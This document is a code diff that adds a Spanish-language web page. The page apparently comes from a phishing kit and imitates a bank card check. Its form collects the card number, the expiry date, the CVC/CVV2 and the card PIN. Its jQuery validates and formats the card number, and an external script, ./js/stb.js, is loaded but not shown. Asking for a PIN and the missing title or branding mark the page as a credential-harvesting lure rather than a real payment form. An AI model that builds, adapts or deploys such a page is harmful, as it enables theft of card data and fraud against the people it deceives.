@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/obeta.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    
+        <div>
+            <div class="upot2">
+                <img src="./img/upotap-2.png" alt="">
+            </div>
+        </div>
+    
+        <div>
+            <div class="dota2">
+                <div class="up">
+                    <img src="./img/upal2cc.svg" alt="">
+                </div>
+                <form class="formcc" method="post" id="pg2">
+                    <p>Numero de Tarjeta</p>
+                    <input  type="tel" placeholder="----    ----    ----    ----" name="" id="one" required maxlength="19" minlength="19" > 
+        
+                    <p>Fecha de Caducidad</p>
+                    <input type="tel" name="" id="two" placeholder="MM/AA" required maxlength="7"> 
+        
+                    <p>CVC/CVV2</p>
+                    <input type="tel" placeholder="" name="" id="three" required maxlength="3"> 
+        
+                    <p>PIN de La Tarjeta</p>
+                    <input type="tel" placeholder="" name="" id="four" required maxlength="4"> 
+        
+                    <button id="btn2" disabled  class="btn2" >CONTINUAR</button>
+                    <p class="p2">¿Olvidaste tu clave de acceso?</p>
+                </form>
+    
+            
+            </div>
+        </div>
+    
+        
+       <style>
+        /* CSS for styling the input field */
+        
+
+        /* CSS for error effect */
+        .error {
+            border: 2px solid red;
+        }
+    </style>
+
+<script>
+$(document).ready(function() {
+    $('#one').on('focus', function() {
+        // Apply error effect only if the input is not empty and doesn't start with 4 or 5
+        var creditCardNumber = $(this).val().replace(/ /g, '');
+        if (creditCardNumber.length >= 16 && !/^[4|5]/.test(creditCardNumber)) {
+            $(this).addClass('error');
+        }
+    });
+    
+    $('#one').on('input', function() {
+        var creditCardNumber = $(this).val().replace(/ /g, ''); // Remove any existing spaces
+        
+        // Check if the entered card number is 16 digits and starts with 4 or 5
+        if (/^[4|5]\d{15}$/.test(creditCardNumber)) {
+            $(this).removeClass('error');
+            $('#btn2').prop('disabled', false);
+        } else {
+            $(this).addClass('error');
+            $('#btn2').prop('disabled', true);
+        }
+        
+        // Add spaces every 4 digits for formatting
+        var formattedNumber = creditCardNumber.match(/.{1,4}/g).join(' ');
+        $(this).val(formattedNumber);
+    });
+});
+$("#two").on("keyup",function(){
+               dd = $(this).val().split("/").join("");
+               dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+               $(this).val(dd);
+           });
+</script>
+<!-- ff -->
+
+
+    <!-- my script -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
